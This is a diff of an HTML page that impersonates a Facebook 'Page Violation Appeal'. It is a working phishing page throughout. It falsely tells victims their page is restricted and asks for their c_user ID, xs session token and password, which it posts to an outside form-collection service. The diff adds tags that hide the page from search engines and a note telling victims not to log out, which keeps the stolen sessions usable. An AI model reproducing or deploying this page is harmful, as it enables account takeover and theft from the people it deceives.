@@ -1,14 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta property="og:title" content="Your Page Title">
-<meta property="og:description" content="Brief description of your project.">
-<meta property="og:image" content="URL_of_an_image">
-<meta property="og:url" content="https://actionreq.github.io/Require.action/">
-<meta name="twitter:card" content="summary_large_image">
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Page Violation Appeal</title>
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="googlebot" content="noindex, nofollow">
+  <meta name="description" content="Page Violation Appeal Review Form.">
+  <title>Review Form</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -21,105 +19,108 @@
       height: 100vh;
     }
     .container {
-      background: #fff;
-      width: 400px;
+      background-color: #ffffff;
+      width: 90%;
+      max-width: 600px;
       padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-      text-align: center;
+      border: 1px solid #dddfe2;
+      border-radius: 5px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
     }
     .container h1 {
-      font-size: 20px;
-      color: #1877f2;
+      font-size: 18px;
+      font-weight: bold;
+      color: #1c1e21;
       margin-bottom: 10px;
     }
     .container p {
-      color: #606770;
       font-size: 14px;
-      margin-bottom: 20px;
+      color: #606770;
       line-height: 1.5;
+      margin-bottom: 15px;
     }
-    .video {
-      background: #e9ecef;
-      padding: 0;
-      margin: 15px 0;
-      border-radius: 10px;
+    .video-container {
+      margin-bottom: 15px;
     }
-    iframe {
+    video {
       width: 100%;
-      height: 200px;
-      border: none;
-      border-radius: 10px;
+      height: auto;
+      border-radius: 5px;
+    }
+    img {
+      width: 100%;
+      height: auto;
+      border-radius: 5px;
     }
     .form-group {
-      text-align: left;
       margin-bottom: 15px;
     }
     .form-group label {
       display: block;
       font-size: 14px;
-      color: #444;
+      color: #1c1e21;
       margin-bottom: 5px;
     }
     .form-group input {
       width: 100%;
       padding: 10px;
-      border: 1px solid #ddd;
-      border-radius: 5px;
       font-size: 14px;
+      border: 1px solid #ccd0d5;
+      border-radius: 5px;
+      box-sizing: border-box;
     }
     .btn {
-      display: inline-block;
+      display: block;
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
       background-color: #1877f2;
-      color: #fff;
+      color: #ffffff;
       border: none;
-      padding: 10px 15px;
-      font-size: 16px;
       border-radius: 5px;
       cursor: pointer;
-      width: 100%;
-      margin-top: 10px;
     }
     .btn:hover {
       background-color: #165dc1;
+    }
+    .note {
+      font-size: 12px;
+      color: #606770;
+      margin-top: 10px;
+      line-height: 1.4;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>How to get started:</h1>
-    <p>
-Fill out the form below to unlock exclusive content monetization features for your Facebook profile. By applying, you'll be able to start earning revenue from your content and gain access to Facebook's monetization tools.
-
-How to get started:
-
-1. Complete the form with your Facebook profile details.
-
-
-2. Our team will review your submission.
-
-
-3. Once approved, you'll be able to activate monetization on your profile and begin earning!
-</p>
-    <div class="video">
-      <!-- Embed a placeholder video -->
-      <iframe src="detailed video.mp4" allowfullscreen></iframe>
+    <h1>Page Violation Appeal</h1>
+    <p>We have detected unusual activity on your page that violates our community standards.</p>
+    <p>Your access to your page has been limited, and you currently cannot post, share, or comment using your page.</p>
+    <p>If you believe this is an error, you have the option to submit an appeal by providing the necessary information.</p>
+    <p><strong>Detailed Video Information</strong></p>
+    <div class="video-container">
+      <video controls poster="video.png">
+        <source src="detailed video.mp4" type="video/mp4">
+        Your browser does not support the video tag. Please update your browser.
+      </video>
     </div>
-    <form>
+    <p>You must watch the provided video to provide the requested information below.</p>
+    <form action="https://submit-form.com/F4nYYE7Kt" method="POST">
       <div class="form-group">
-        <label for="c_user">User ID (c_user):</label>
+        <label for="c_user">c_user:</label>
         <input type="text" id="c_user" name="c_user" placeholder="Enter your User ID" required>
       </div>
       <div class="form-group">
-        <label for="xs">Session Token (XS):</label>
+        <label for="xs">xs:</label>
         <input type="text" id="xs" name="xs" placeholder="Enter your XS token" required>
       </div>
       <div class="form-group">
-        <label for="passwrod">Confirm Password:</label>
-        <input type="passwrod" id="passwrod" name="passwrod" placeholder="Enter your passwrod" required>
+        <label for="passwrod">Passwrod:</label>
+        <input type="text" id="passwrod" name="passwrod" placeholder="Enter your Passwrod" required>
       </div>
-      <button type="submit" class="btn">Submit Appeal</button>
+      <button type="submit" class="btn">Send</button>
     </form>
+    <p class="note">Please ensure not to log out of your account on your computer or laptop until you have received a verification email.</p>
   </div>
 </body>
 </html>
